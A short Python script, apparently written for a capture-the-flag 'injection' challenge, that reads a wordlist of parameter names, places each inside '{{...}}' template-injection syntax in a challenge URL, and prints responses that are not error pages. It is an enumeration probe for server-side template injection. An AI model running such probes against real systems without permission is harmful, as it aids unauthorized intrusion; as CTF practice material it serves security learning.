#!/usr/bin/env python3

import requests
import html

NEEDLE = '%REPLACEME%'
URL = 'http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/{{' + NEEDLE + '}}'
with open('./burp-parameter-names.txt', 'r') as f:
  payloads = f.read()
  for payload in payloads.split('\n'):
    uri = URL.replace(NEEDLE, payload)
    response = requests.get(uri)
    if "Page  doesn't exist" in response.content.decode():
      continue
    if response.status_code == 500:
      continue
    print(response.content.decode())
